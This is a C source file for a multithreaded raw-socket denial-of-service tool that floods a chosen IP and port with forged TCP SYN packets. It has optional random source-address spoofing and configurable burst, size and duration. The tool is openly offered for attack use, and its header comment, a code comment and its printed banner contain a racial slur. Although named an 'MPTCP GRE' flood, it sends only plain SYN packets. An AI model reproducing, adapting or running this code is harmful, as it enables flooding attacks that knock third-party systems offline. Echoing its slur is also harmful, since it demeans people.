/*
 * MPTCP GRE Tunnel Flood - Standalone x86/x64
 * by c0re_x64 for 0v.lol // nigga
 * usage: sudo ./mptcpgre <ip> <port> <threads> <duration> [--spoof][--burst N][--size N]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>
#include <errno.h>
#include <fcntl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>

struct mptcpgre_config {
    char target_ip[32];
    uint16_t target_port;
    uint32_t threads;
    uint32_t duration;
    uint8_t ip_tos, ip_ttl, dont_frag;
    uint16_t sport, dport;
    int data_len, burst;
    uint8_t spoof_src;
    volatile uint8_t running;
    uint64_t total_packets, total_bytes;
};

static struct mptcpgre_config config;
static pthread_mutex_t stats_mutex = PTHREAD_MUTEX_INITIALIZER;
static uint32_t rand_state[4];

static void rand_init(void) {
    rand_state[0] = time(NULL); rand_state[1] = getpid() ^ getppid();
    rand_state[2] = clock(); rand_state[3] = rand_state[2] ^ rand_state[1];
}

static uint32_t rand_next(void) {
    uint32_t t = rand_state[0]; t ^= t << 11; t ^= t >> 8;
    rand_state[0] = rand_state[1]; rand_state[1] = rand_state[2];
    rand_state[2] = rand_state[3]; rand_state[3] ^= rand_state[3] >> 19; rand_state[3] ^= t;
    return rand_state[3];
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;
    for (; count > 1; count -= 2) sum += *addr++;
    if (count == 1) sum += (char)*addr;
    sum = (sum >> 16) + (sum & 0xFFFF); sum += (sum >> 16);
    return ~sum;
}

static uint16_t checksum_tcp(struct iphdr *iph, struct tcphdr *tcph, uint16_t data_len, int len) {
    const uint16_t *buf = (uint16_t *)tcph; uint32_t sum = 0;
    while (len > 1) { sum += *buf++; len -= 2; }
    if (len == 1) sum += *((uint8_t *)buf);
    sum += (iph->saddr >> 16) & 0xFFFF; sum += iph->saddr & 0xFFFF;
    sum += (iph->daddr >> 16) & 0xFFFF; sum += iph->daddr & 0xFFFF;
    sum += htons(IPPROTO_TCP); sum += data_len;
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (uint16_t)(~sum);
}

static void build_tcp_opts(uint8_t *o, uint32_t tsval, uint32_t tsecr, uint16_t mss, uint8_t wscale, int *len) {
    int off = 0;
    o[off++] = 2; o[off++] = 4; *((uint16_t *)(o + off)) = htons(mss); off += 2;
    o[off++] = 1; o[off++] = 3; o[off++] = 3; o[off++] = wscale;
    o[off++] = 1; o[off++] = 4; o[off++] = 2;
    o[off++] = 8; o[off++] = 10; *((uint32_t *)(o + off)) = htonl(tsval); off += 4;
    *((uint32_t *)(o + off)) = htonl(tsecr); off += 4;
    while (off % 4 != 0) o[off++] = 1;
    *len = off;
}

// nigga mptcpgre
static void* mptcpgre_thread(void *arg) {
    int tid = *(int *)arg; free(arg);
    int raw = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (raw < 0) { fprintf(stderr, "[%d] raw\n", tid); return NULL; }
    int one = 1;
    setsockopt(raw, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int sndbuf = 16 * 1024 * 1024;
    setsockopt(raw, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
    fcntl(raw, F_SETFL, O_NONBLOCK | fcntl(raw, F_GETFL, 0));
    uint32_t target = inet_addr(config.target_ip);
    struct sockaddr_in dst = { .sin_family = AF_INET, .sin_addr.s_addr = target, .sin_port = htons(config.target_port) };
    uint8_t packet[2048];
    uint64_t pkts = 0, bytes = 0;
    time_t end = time(NULL) + config.duration;
    printf("[thread %d] started\n", tid);
    while (config.running && time(NULL) < end) {
        for (uint32_t t = 0; t < config.threads; t++) {
            struct iphdr *iph = (struct iphdr *)packet;
            struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
            uint8_t *opts = (uint8_t *)(tcph + 1);
            char *pl = (char *)(packet + sizeof(struct iphdr) + sizeof(struct tcphdr) + 64);
            int opt_len = 0;
            build_tcp_opts(opts, rand_next(), 0, 1400 + (rand_next() & 0x0f), 6, &opt_len);
            int tcp_len = sizeof(struct tcphdr) + opt_len;
            int total = sizeof(struct iphdr) + tcp_len + config.data_len;
            if (total > (int)sizeof(packet)) total = sizeof(struct iphdr) + tcp_len;
            uint32_t src = config.spoof_src ? rand_next() : 0;
            iph->version = 4; iph->ihl = 5; iph->tos = config.ip_tos;
            iph->tot_len = htons(total); iph->id = htons(rand_next() & 0xffff);
            iph->ttl = config.ip_ttl; iph->protocol = IPPROTO_TCP;
            iph->frag_off = config.dont_frag ? htons(1 << 14) : 0;
            iph->saddr = src; iph->daddr = target;
            tcph->source = htons((config.sport == 0xFFFF) ? (rand_next() % 60000 + 1024) : config.sport);
            tcph->dest = htons((config.dport == 0xFFFF) ? (rand_next() % 60000 + 1024) : config.dport);
            tcph->seq = htonl(rand_next()); tcph->ack_seq = 0;
            tcph->doff = tcp_len / 4; tcph->res1 = 0;
            tcph->syn = 1; tcph->ack = tcph->psh = tcph->fin = tcph->rst = tcph->urg = 0;
            tcph->window = htons(65535); tcph->urg_ptr = 0;
            if (config.data_len > 0) {
                int n = config.data_len > 512 ? 512 : config.data_len;
                for (int k = 0; k < n; k++) pl[k] = (k % 94) + 33;
            }
            iph->check = 0; iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
            tcph->check = 0; tcph->check = checksum_tcp(iph, tcph, htons(tcp_len + config.data_len), tcp_len + config.data_len);
            for (int b = 0; b < config.burst; b++) {
                int sent = sendto(raw, packet, total, MSG_NOSIGNAL, (struct sockaddr *)&dst, sizeof(dst));
                if (sent > 0) { pkts++; bytes += sent; }
            }
        }
    }
    pthread_mutex_lock(&stats_mutex);
    config.total_packets += pkts; config.total_bytes += bytes;
    pthread_mutex_unlock(&stats_mutex);
    printf("[thread %d] stopped %llu %llu\n", tid, (unsigned long long)pkts, (unsigned long long)bytes);
    close(raw);
    return NULL;
}

static void sigint_handler(int sig) { (void)sig; config.running = 0; }

int main(int argc, char **argv) {
    if (argc < 5) { printf("mptcpgre <ip> <port> <threads> <duration> [--spoof][--burst N][--size N]\n"); return 1; }
    if (geteuid() != 0) { fprintf(stderr, "root\n"); return 1; }
    memset(&config, 0, sizeof(config));
    strncpy(config.target_ip, argv[1], sizeof(config.target_ip) - 1);
    config.target_port = atoi(argv[2]); config.threads = atoi(argv[3]); config.duration = atoi(argv[4]);
    config.ip_ttl = 64; config.dont_frag = 1;
    config.sport = 0xFFFF; config.dport = config.target_port;
    config.data_len = 0; config.burst = 4; config.running = 1;
    for (int i = 5; i < argc; i++) {
        if (strcmp(argv[i], "--tos") == 0 && i+1 < argc) config.ip_tos = atoi(argv[++i]);
        else if (strcmp(argv[i], "--ttl") == 0 && i+1 < argc) config.ip_ttl = atoi(argv[++i]);
        else if (strcmp(argv[i], "--df") == 0) config.dont_frag = 1;
        else if (strcmp(argv[i], "--sport") == 0 && i+1 < argc) config.sport = atoi(argv[++i]);
        else if (strcmp(argv[i], "--dport") == 0 && i+1 < argc) config.dport = atoi(argv[++i]);
        else if (strcmp(argv[i], "--size") == 0 && i+1 < argc) config.data_len = atoi(argv[++i]);
        else if (strcmp(argv[i], "--burst") == 0 && i+1 < argc) config.burst = atoi(argv[++i]);
        else if (strcmp(argv[i], "--spoof") == 0) config.spoof_src = 1;
    }
    if (config.data_len > 512) config.data_len = 512;
    if (config.threads < 1 || config.threads > 256 || config.duration < 1) return 1;
    rand_init();
    signal(SIGINT, sigint_handler); signal(SIGTERM, sigint_handler);
    printf("\n MPTCP GRE - by c0re_x64 for 0v.lol // nigga\n\n");
    pthread_t *threads = malloc(config.threads * sizeof(pthread_t));
    if (!threads) return 1;
    for (uint32_t i = 0; i < config.threads; i++) {
        int *p = malloc(sizeof(int)); *p = i + 1;
        pthread_create(&threads[i], NULL, mptcpgre_thread, p);
        usleep(100000);
    }
    for (uint32_t i = 0; i < config.threads; i++) pthread_join(threads[i], NULL);
    free(threads);
    printf("\n[*] done %llu %llu\n", (unsigned long long)config.total_packets, (unsigned long long)config.total_bytes);
    return 0;
}
